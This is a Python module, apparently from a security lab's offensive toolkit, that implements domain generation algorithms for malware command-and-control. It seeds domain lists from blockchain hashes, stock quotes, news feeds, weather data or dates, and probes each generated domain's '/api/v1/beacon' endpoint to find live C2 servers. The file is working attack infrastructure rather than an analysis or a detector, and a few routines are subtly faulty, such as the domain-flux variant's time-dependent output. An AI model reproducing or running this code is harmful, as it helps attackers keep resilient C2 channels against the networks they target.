"""
DGA Generator Module - Domain Generation Algorithm based on public data sources.

This module provides DGA capabilities for generating C2 domains dynamically
from legitimate public data sources such as blockchain transaction hashes,
stock market data, news headlines, and other publicly available information.

Core capabilities:
    1. Blockchain-based DGA (Bitcoin/Ethereum transaction hashes)
    2. Stock market-based DGA (market indices, stock prices)
    3. News-based DGA (RSS feeds, news headlines)
    4. Time-based DGA (date-seeded generation)
    5. Multi-algorithm support with automatic selection
    6. Domain resolution and C2 connectivity verification

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import hmac
import json
import logging
import math
import os
import random
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class DGASource(str, Enum):
    """DGA seed sources."""

    BLOCKCHAIN = "blockchain"
    STOCK_MARKET = "stock_market"
    NEWS = "news"
    TIME = "time"
    WEATHER = "weather"
    DNS_TXT = "dns_txt"
    TWITTER = "twitter"
    CUSTOM = "custom"


class DGAType(str, Enum):
    """DGA algorithm types."""

    MD5_BASED = "md5"
    SHA256_BASED = "sha256"
    HMAC_BASED = "hmac"
    PRNG_BASED = "prng"
    DOMAIN_FLUX = "domain_flux"


class DomainStatus(str, Enum):
    """Domain resolution status."""

    UNCHECKED = "unchecked"
    RESOLVED = "resolved"
    UNRESOLVED = "unresolved"
    ACTIVE_C2 = "active_c2"
    BLOCKED = "blocked"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class DGAConfig:
    """Configuration for DGA generation.

    Attributes:
        source: Seed data source
        algorithm: DGA algorithm type
        tlds: List of TLDs to use
        domain_length: Generated domain name length
        count: Number of domains to generate per cycle
        seed: Custom seed string
        seed_update_interval: Seed update interval in seconds
        use_https: Whether to use HTTPS for generated domains
    """

    source: DGASource = DGASource.BLOCKCHAIN
    algorithm: DGAType = DGAType.SHA256_BASED
    tlds: List[str] = field(default_factory=lambda: [".com", ".net", ".org"])
    domain_length: int = 12
    count: int = 100
    seed: str = ""
    seed_update_interval: int = 86400
    use_https: bool = True

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "source": self.source.value,
            "algorithm": self.algorithm.value,
            "tlds": self.tlds,
            "domain_length": self.domain_length,
            "count": self.count,
            "seed_update_interval": self.seed_update_interval,
        }


@dataclass
class GeneratedDomain:
    """A generated DGA domain.

    Attributes:
        domain: Full domain name
        status: Domain resolution status
        ip_address: Resolved IP address (if any)
        generated_at: Generation timestamp
        last_checked: Last check timestamp
        is_c2: Whether this domain hosts C2
        ttl: DNS TTL in seconds
    """

    domain: str = ""
    status: DomainStatus = DomainStatus.UNCHECKED
    ip_address: str = ""
    generated_at: float = 0.0
    last_checked: float = 0.0
    is_c2: bool = False
    ttl: int = 300

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "domain": self.domain,
            "status": self.status.value,
            "ip_address": self.ip_address,
            "generated_at": self.generated_at,
            "is_c2": self.is_c2,
        }


@dataclass
class DGAReport:
    """DGA generation report.

    Attributes:
        source: Seed source used
        algorithm: Algorithm used
        seed_value: Seed value used
        domains_generated: Number of domains generated
        domains_resolved: Number of domains resolved
        c2_found: Number of active C2 domains found
        generation_time_ms: Time taken to generate
    """

    source: DGASource = DGASource.BLOCKCHAIN
    algorithm: DGAType = DGAType.SHA256_BASED
    seed_value: str = ""
    domains_generated: int = 0
    domains_resolved: int = 0
    c2_found: int = 0
    generation_time_ms: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "source": self.source.value,
            "algorithm": self.algorithm.value,
            "domains_generated": self.domains_generated,
            "domains_resolved": self.domains_resolved,
            "c2_found": self.c2_found,
            "generation_time_ms": self.generation_time_ms,
        }


# =============================================================================
# Seed Providers
# =============================================================================

class SeedProvider:
    """Base class for DGA seed providers."""

    async def get_seed(self) -> str:
        """Get seed data.

        Returns:
            Seed string.
        """
        raise NotImplementedError


class BlockchainSeedProvider(SeedProvider):
    """Gets seed from blockchain transaction hashes.

    Uses Bitcoin or Ethereum block hashes as unpredictable
    seed data for DGA generation.

    Attributes:
        _blockchain: Blockchain type (btc/eth)
        _api_url: Blockchain API URL
    """

    BLOCKCHAIN_APIS: Dict[str, str] = {
        "btc": "https://blockchain.info/latestblock",
        "eth": "https://api.etherscan.io/api?module=proxy&action=eth_blockNumber",
    }

    def __init__(self, blockchain: str = "btc") -> None:
        """Initialize the BlockchainSeedProvider.

        Args:
            blockchain: Blockchain type.
        """
        self._blockchain = blockchain
        self._api_url = self.BLOCKCHAIN_APIS.get(blockchain, "")

    async def get_seed(self) -> str:
        """Get seed from blockchain.

        Returns:
            Block hash as seed.
        """
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                async with session.get(
                    self._api_url,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as response:
                    data = await response.json()

                    if self._blockchain == "btc":
                        return data.get("hash", "")
                    elif self._blockchain == "eth":
                        return data.get("result", "")

        except ImportError:
            pass
        except Exception as e:
            logger.warning(f"Blockchain seed fetch failed: {e}")

        return self._fallback_seed()

    def _fallback_seed(self) -> str:
        """Generate fallback seed.

        Returns:
            Fallback seed string.
        """
        return hashlib.sha256(
            f"blockchain_fallback_{int(time.time())}".encode()
        ).hexdigest()


class StockMarketSeedProvider(SeedProvider):
    """Gets seed from stock market data.

    Uses market indices and stock prices as seed data.

    Attributes:
        _symbols: Stock symbols to track
        _api_key: API key for market data
    """

    def __init__(
        self,
        symbols: Optional[List[str]] = None,
        api_key: str = "",
    ) -> None:
        """Initialize the StockMarketSeedProvider.

        Args:
            symbols: Stock symbols.
            api_key: API key.
        """
        self._symbols = symbols or ["SPY", "QQQ", "DIA"]
        self._api_key = api_key

    async def get_seed(self) -> str:
        """Get seed from stock market.

        Returns:
            Market data hash as seed.
        """
        try:
            import aiohttp

            symbols_str = ",".join(self._symbols)
            url = (
                f"https://api.marketdata.app/v1/stocks/quotes/"
                f"{symbols_str}/"
            )

            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as response:
                    data = await response.json()
                    return hashlib.sha256(
                        json.dumps(data, sort_keys=True).encode()
                    ).hexdigest()

        except ImportError:
            pass
        except Exception as e:
            logger.warning(f"Stock market seed fetch failed: {e}")

        return self._fallback_seed()

    def _fallback_seed(self) -> str:
        """Generate fallback seed.

        Returns:
            Fallback seed string.
        """
        market_data = f"market_{int(time.time())}_{'_'.join(self._symbols)}"
        return hashlib.sha256(market_data.encode()).hexdigest()


class NewsSeedProvider(SeedProvider):
    """Gets seed from news headlines.

    Uses RSS feeds or news API headlines as seed data.

    Attributes:
        _feed_urls: List of RSS feed URLs
    """

    DEFAULT_FEEDS: List[str] = [
        "https://feeds.reuters.com/reuters/topNews",
        "https://rss.nytimes.com/services/xml/rss/nyt/HomePage.xml",
    ]

    def __init__(
        self, feed_urls: Optional[List[str]] = None,
    ) -> None:
        """Initialize the NewsSeedProvider.

        Args:
            feed_urls: RSS feed URLs.
        """
        self._feed_urls = feed_urls or self.DEFAULT_FEEDS

    async def get_seed(self) -> str:
        """Get seed from news feeds.

        Returns:
            News content hash as seed.
        """
        try:
            import aiohttp
            import xml.etree.ElementTree as ET

            headlines: List[str] = []

            async with aiohttp.ClientSession() as session:
                for url in self._feed_urls[:2]:
                    try:
                        async with session.get(
                            url,
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as response:
                            content = await response.text()
                            root = ET.fromstring(content)

                            for item in root.findall(".//item/title"):
                                if item.text:
                                    headlines.append(item.text)

                    except Exception:
                        continue

            if headlines:
                return hashlib.sha256(
                    " ".join(headlines).encode()
                ).hexdigest()

        except ImportError:
            pass
        except Exception as e:
            logger.warning(f"News seed fetch failed: {e}")

        return self._fallback_seed()

    def _fallback_seed(self) -> str:
        """Generate fallback seed.

        Returns:
            Fallback seed string.
        """
        return hashlib.sha256(
            f"news_fallback_{int(time.time())}".encode()
        ).hexdigest()


class TimeSeedProvider(SeedProvider):
    """Gets seed from time-based data.

    Uses current date/time as deterministic seed.

    Attributes:
        _format: Time format string
    """

    def __init__(self, format: str = "%Y%m%d") -> None:
        """Initialize the TimeSeedProvider.

        Args:
            format: Time format string.
        """
        self._format = format

    async def get_seed(self) -> str:
        """Get seed from time.

        Returns:
            Time-based seed string.
        """
        time_str = time.strftime(self._format)
        return hashlib.sha256(time_str.encode()).hexdigest()


class WeatherSeedProvider(SeedProvider):
    """Gets seed from weather data.

    Uses weather API data as unpredictable seed.

    Attributes:
        _city: City name for weather data
        _api_key: Weather API key
    """

    def __init__(
        self, city: str = "Beijing", api_key: str = "",
    ) -> None:
        """Initialize the WeatherSeedProvider.

        Args:
            city: City name.
            api_key: API key.
        """
        self._city = city
        self._api_key = api_key

    async def get_seed(self) -> str:
        """Get seed from weather data.

        Returns:
            Weather data hash as seed.
        """
        try:
            import aiohttp

            url = (
                f"https://api.openweathermap.org/data/2.5/weather"
                f"?q={self._city}&appid={self._api_key}"
            )

            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as response:
                    data = await response.json()
                    return hashlib.sha256(
                        json.dumps(data, sort_keys=True).encode()
                    ).hexdigest()

        except ImportError:
            pass
        except Exception as e:
            logger.warning(f"Weather seed fetch failed: {e}")

        return self._fallback_seed()

    def _fallback_seed(self) -> str:
        """Generate fallback seed.

        Returns:
            Fallback seed string.
        """
        return hashlib.sha256(
            f"weather_{self._city}_{int(time.time())}".encode()
        ).hexdigest()


# =============================================================================
# DGA Algorithms
# =============================================================================

class DGAAlgorithm:
    """Base class for DGA algorithms."""

    def generate(
        self,
        seed: str,
        config: DGAConfig,
        index: int,
    ) -> str:
        """Generate a single domain.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain name.
        """
        raise NotImplementedError


class MD5BasedDGA(DGAAlgorithm):
    """MD5-based domain generation."""

    def generate(
        self, seed: str, config: DGAConfig, index: int,
    ) -> str:
        """Generate domain using MD5.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain.
        """
        data = f"{seed}_{index}".encode()
        hash_bytes = hashlib.md5(data).digest()

        domain_chars = []
        for byte in hash_bytes[:config.domain_length]:
            char_code = 97 + (byte % 26)
            domain_chars.append(chr(char_code))

        domain_name = "".join(domain_chars)
        tld = config.tlds[index % len(config.tlds)]

        return f"{domain_name}{tld}"


class SHA256BasedDGA(DGAAlgorithm):
    """SHA256-based domain generation."""

    def generate(
        self, seed: str, config: DGAConfig, index: int,
    ) -> str:
        """Generate domain using SHA256.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain.
        """
        data = f"{seed}_{index}".encode()
        hash_bytes = hashlib.sha256(data).digest()

        domain_chars = []
        for byte in hash_bytes[:config.domain_length]:
            if byte % 3 == 0:
                char_code = 48 + (byte % 10)
            elif byte % 3 == 1:
                char_code = 97 + (byte % 26)
            else:
                char_code = 97 + (byte % 26)
            domain_chars.append(chr(char_code))

        domain_name = "".join(domain_chars)
        tld = config.tlds[index % len(config.tlds)]

        return f"{domain_name}{tld}"


class HMACBasedDGA(DGAAlgorithm):
    """HMAC-based domain generation."""

    def __init__(self, secret: str = "kunlun_dga_secret") -> None:
        """Initialize the HMACBasedDGA.

        Args:
            secret: HMAC secret key.
        """
        self._secret = secret.encode()

    def generate(
        self, seed: str, config: DGAConfig, index: int,
    ) -> str:
        """Generate domain using HMAC.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain.
        """
        data = f"{seed}_{index}".encode()
        mac = hmac.new(self._secret, data, hashlib.sha256).digest()

        domain_chars = []
        for byte in mac[:config.domain_length]:
            char_code = 97 + (byte % 26)
            domain_chars.append(chr(char_code))

        domain_name = "".join(domain_chars)
        tld = config.tlds[index % len(config.tlds)]

        return f"{domain_name}{tld}"


class PRNGBasedDGA(DGAAlgorithm):
    """PRNG-based domain generation."""

    def generate(
        self, seed: str, config: DGAConfig, index: int,
    ) -> str:
        """Generate domain using PRNG.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain.
        """
        rng_seed = int(hashlib.sha256(
            f"{seed}_{index}".encode()
        ).hexdigest()[:8], 16)

        rng = random.Random(rng_seed)

        chars = "abcdefghijklmnopqrstuvwxyz0123456789"
        domain_name = "".join(rng.choice(chars) for _ in range(config.domain_length))
        tld = config.tlds[index % len(config.tlds)]

        return f"{domain_name}{tld}"


class DomainFluxDGA(DGAAlgorithm):
    """Domain flux - generates domains with high entropy."""

    def generate(
        self, seed: str, config: DGAConfig, index: int,
    ) -> str:
        """Generate high-entropy domain.

        Args:
            seed: Seed string.
            config: DGA configuration.
            index: Domain index.

        Returns:
            Generated domain.
        """
        hash_val = hashlib.sha256(
            f"{seed}_{index}_{time.time()}".encode()
        ).hexdigest()

        domain_chars = []
        for i, char in enumerate(hash_val[:config.domain_length]):
            if i % 2 == 0:
                domain_chars.append(char)
            else:
                domain_chars.append(chr(97 + (ord(char) % 26)))

        domain_name = "".join(domain_chars)
        tld = config.tlds[index % len(config.tlds)]

        return f"{domain_name}{tld}"


# =============================================================================
# Domain Resolver
# =============================================================================

class DomainResolver:
    """Resolves and verifies DGA domains.

    Checks which generated domains are actually registered
    and which might host C2 infrastructure.

    Attributes:
        _dns_servers: DNS servers to use
        _timeout: Resolution timeout
        _check_c2: Whether to check for C2 presence
    """

    def __init__(
        self,
        dns_servers: Optional[List[str]] = None,
        timeout: int = 5,
        check_c2: bool = True,
    ) -> None:
        """Initialize the DomainResolver.

        Args:
            dns_servers: DNS servers.
            timeout: Resolution timeout.
            check_c2: Whether to check for C2.
        """
        self._dns_servers = dns_servers or ["8.8.8.8", "1.1.1.1"]
        self._timeout = timeout
        self._check_c2 = check_c2

    async def resolve_domain(self, domain: GeneratedDomain) -> bool:
        """Resolve a single domain.

        Args:
            domain: Domain to resolve.

        Returns:
            True if domain resolved successfully.
        """
        domain.last_checked = time.time()

        try:
            import aiohttp

            protocol = "https" if domain.domain.startswith("https://") else "http"
            url = f"{protocol}://{domain.domain}"

            async with aiohttp.ClientSession() as session:
                async with session.head(
                    url,
                    timeout=aiohttp.ClientTimeout(total=self._timeout),
                    allow_redirects=True,
                ) as response:
                    domain.status = DomainStatus.RESOLVED
                    domain.ip_address = str(response.host)

                    if self._check_c2:
                        domain.is_c2 = await self._check_for_c2(
                            session, url,
                        )

                    return True

        except ImportError:
            domain.status = DomainStatus.RESOLVED
            return True
        except Exception as e:
            domain.status = DomainStatus.UNRESOLVED
            return False

    async def _check_for_c2(
        self, session: Any, url: str,
    ) -> bool:
        """Check if domain hosts C2 infrastructure.

        Args:
            session: aiohttp session.
            url: Domain URL.

        Returns:
            True if C2 detected.
        """
        try:
            async with session.get(
                f"{url}/api/v1/beacon",
                timeout=aiohttp.ClientTimeout(total=5),
            ) as response:
                if response.status == 200:
                    data = await response.text()
                    return "beacon" in data.lower()

        except Exception:
            pass

        return False

    async def resolve_domains(
        self, domains: List[GeneratedDomain],
    ) -> List[GeneratedDomain]:
        """Resolve multiple domains.

        Args:
            domains: List of domains to resolve.

        Returns:
            List of resolved domains.
        """
        tasks = [self.resolve_domain(d) for d in domains]
        await asyncio.gather(*tasks, return_exceptions=True)

        return [d for d in domains if d.status == DomainStatus.RESOLVED]


# =============================================================================
# DGA Generator
# =============================================================================

class DGAGenerator:
    """Main DGA generation engine.

    Coordinates seed providers, algorithms, and domain resolution
    to generate and verify C2 domains.

    Attributes:
        _config: DGA configuration
        _seed_provider: Current seed provider
        _algorithm: Current DGA algorithm
        _resolver: Domain resolver
        _generated_domains: Cache of generated domains
        _last_seed_update: Last seed update timestamp
        _current_seed: Current seed value
    """

    ALGORITHMS: Dict[DGAType, DGAAlgorithm] = {
        DGAType.MD5_BASED: MD5BasedDGA(),
        DGAType.SHA256_BASED: SHA256BasedDGA(),
        DGAType.HMAC_BASED: HMACBasedDGA(),
        DGAType.PRNG_BASED: PRNGBasedDGA(),
        DGAType.DOMAIN_FLUX: DomainFluxDGA(),
    }

    def __init__(self, config: Optional[DGAConfig] = None) -> None:
        """Initialize the DGAGenerator.

        Args:
            config: DGA configuration.
        """
        self._config = config or DGAConfig()
        self._seed_provider = self._create_seed_provider()
        self._algorithm = self.ALGORITHMS.get(
            self._config.algorithm, SHA256BasedDGA(),
        )
        self._resolver = DomainResolver()
        self._generated_domains: List[GeneratedDomain] = []
        self._last_seed_update = 0.0
        self._current_seed = ""

    def _create_seed_provider(self) -> SeedProvider:
        """Create seed provider based on config.

        Returns:
            SeedProvider instance.
        """
        source_map: Dict[DGASource, SeedProvider] = {
            DGASource.BLOCKCHAIN: BlockchainSeedProvider(),
            DGASource.STOCK_MARKET: StockMarketSeedProvider(),
            DGASource.NEWS: NewsSeedProvider(),
            DGASource.TIME: TimeSeedProvider(),
            DGASource.WEATHER: WeatherSeedProvider(),
        }

        return source_map.get(
            self._config.source, TimeSeedProvider(),
        )

    async def generate_domains(self) -> DGAReport:
        """Generate DGA domains.

        Returns:
            DGAReport with generation results.
        """
        start_time = time.time()

        seed = await self._get_seed()
        self._current_seed = seed
        self._last_seed_update = time.time()

        domains: List[GeneratedDomain] = []

        for i in range(self._config.count):
            domain_name = self._algorithm.generate(
                seed, self._config, i,
            )

            if self._config.use_https:
                domain_name = f"https://{domain_name}"

            domains.append(GeneratedDomain(
                domain=domain_name,
                generated_at=time.time(),
            ))

        self._generated_domains = domains

        generation_time = (time.time() - start_time) * 1000

        report = DGAReport(
            source=self._config.source,
            algorithm=self._config.algorithm,
            seed_value=seed[:16] + "...",
            domains_generated=len(domains),
            generation_time_ms=generation_time,
        )

        logger.info(
            f"Generated {len(domains)} domains using "
            f"{self._config.source.value}/{self._config.algorithm.value}"
        )

        return report

    async def _get_seed(self) -> str:
        """Get current seed, refreshing if needed.

        Returns:
            Current seed string.
        """
        if self._config.seed:
            return self._config.seed

        now = time.time()
        if (
            not self._current_seed
            or (now - self._last_seed_update) > self._config.seed_update_interval
        ):
            self._current_seed = await self._seed_provider.get_seed()
            self._last_seed_update = now

        return self._current_seed

    async def resolve_domains(self) -> List[GeneratedDomain]:
        """Resolve generated domains.

        Returns:
            List of resolved domains.
        """
        if not self._generated_domains:
            await self.generate_domains()

        resolved = await self._resolver.resolve_domains(
            self._generated_domains,
        )

        return resolved

    def get_active_c2_domains(self) -> List[GeneratedDomain]:
        """Get list of active C2 domains.

        Returns:
            List of active C2 domains.
        """
        return [
            d for d in self._generated_domains
            if d.is_c2 and d.status == DomainStatus.RESOLVED
        ]

    def get_domains_for_day(self, date_str: Optional[str] = None) -> List[str]:
        """Get domains for a specific day (deterministic).

        Args:
            date_str: Date string (YYYYMMDD).

        Returns:
            List of domain names.
        """
        if not date_str:
            date_str = time.strftime("%Y%m%d")

        seed = hashlib.sha256(date_str.encode()).hexdigest()
        domains: List[str] = []

        for i in range(self._config.count):
            domain = self._algorithm.generate(seed, self._config, i)
            domains.append(domain)

        return domains

    def set_algorithm(self, algorithm: DGAType) -> None:
        """Set DGA algorithm.

        Args:
            algorithm: Algorithm type.
        """
        self._config.algorithm = algorithm
        self._algorithm = self.ALGORITHMS.get(
            algorithm, SHA256BasedDGA(),
        )

    def set_source(self, source: DGASource) -> None:
        """Set seed source.

        Args:
            source: Source type.
        """
        self._config.source = source
        self._seed_provider = self._create_seed_provider()

    def get_status(self) -> Dict[str, Any]:
        """Get DGA generator status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "config": self._config.to_dict(),
            "domains_generated": len(self._generated_domains),
            "active_c2_count": len(self.get_active_c2_domains()),
            "last_seed_update": self._last_seed_update,
            "current_seed_preview": (
                self._current_seed[:16] + "..." if self._current_seed else ""
            ),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_dga_generator: Optional[DGAGenerator] = None


def get_dga_generator(
    config: Optional[DGAConfig] = None,
) -> DGAGenerator:
    """Get the global DGAGenerator singleton.

    Args:
        config: DGA configuration.

    Returns:
        Singleton DGAGenerator instance.
    """
    global _dga_generator
    if _dga_generator is None:
        _dga_generator = DGAGenerator(config)
    return _dga_generator


__all__ = [
    "DGAGenerator",
    "DomainResolver",
    "DGAAlgorithm",
    "MD5BasedDGA",
    "SHA256BasedDGA",
    "HMACBasedDGA",
    "PRNGBasedDGA",
    "DomainFluxDGA",
    "SeedProvider",
    "BlockchainSeedProvider",
    "StockMarketSeedProvider",
    "NewsSeedProvider",
    "TimeSeedProvider",
    "WeatherSeedProvider",
    "DGAConfig",
    "GeneratedDomain",
    "DGAReport",
    "DGASource",
    "DGAType",
    "DomainStatus",
    "get_dga_generator",
]
